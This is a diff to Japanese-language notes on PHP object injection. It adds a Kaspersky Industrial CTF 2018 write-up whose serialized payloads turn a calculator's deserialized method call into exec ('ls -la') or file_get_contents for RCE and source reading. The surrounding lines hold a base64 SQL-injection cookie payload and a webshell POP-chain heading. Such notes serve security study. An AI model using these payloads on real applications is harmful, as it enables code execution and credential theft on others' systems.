@@ -237,7 +237,7 @@ print (serialize(new Example3));
 // O:8:"Example3":1:{s:6:" * obj";O:13:"SQL_Row_Value":1:{s:21:"SQL_Row_Value_table";s:10:"users -- -";}}
 ?>
 ```
-### __destruct (webshell)
+### \_\_destruct (webshell)
 https://hackerone.com/reports/407552   
 
 以下が最終的なpopchianのコード。   
@@ -538,9 +538,27 @@ echo base64_encode(serialize($ex1))."\n";
 ```txt
 Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODk6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPS0xIHVuaW9uIHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIHVzZXJzMiB3aGVyZSBpZD0xIjt9=
 ```
-##
+## RCE in PHP Object injetcion (Web 1 Kaspersky Industrial CTF 2018)
+https://medium.com/@awidardi/web-1-kaspersky-industrial-ctf-2018-95af27db6b2  
 - **entrypoint**  
+`1+2`とかを計算できるWebサイトがあって、入力すると以下のようなオブジェクトを作成して実行できる。この文字列を表示する機能と文字列を与えてデシリアライズして計算できる機能がある。  
+```txt
+// 1+2
+:10:”Expression”:3:{s:14:” Expression op”;s:3:”sum”;s:18:” Expression params”;a:2:{i:0;d:1;i:1;d:2;}s:9:”stringify”;s:5:”1 + 2";}
+
+// 2/0
+O:10:”Expression”:3:{s:14:” Expression op”;s:3:”div”;s:18:” Expression params”;a:2:{i:0;d:2;i:1;d:0;}s:9:”stringify”;s:5:”2 / 0";}
+```
+ここの、`div`の部分がメソッド名にあたり、`{i:0;d:2;i:1;d:0;}`が引数にあたる。  
+なので、`exec`,`ls -al`とかに書き換えればRCEできる！  
+以下で`file_get_contents`,`index.php`でソースを表示できる！  
+```txt
+O:10:”Expression”:3:{s:14:” Expression op”;s:17:”file_get_contents”;s:18:” Expression params”;s:9:”index.php”;s:9:”stringify”;s:5:”2 / 0";}
+```
 - **payload**  
+```txt
+O:10:”Expression”:3:{s:14:” Expression op”;s:4:”exec”;s:18:” Expression params”;s:6:”ls -la”;s:9:”stringify”;s:5:”2 / 0";}
+```
 ##
 - **entrypoint**  
 - **payload**  
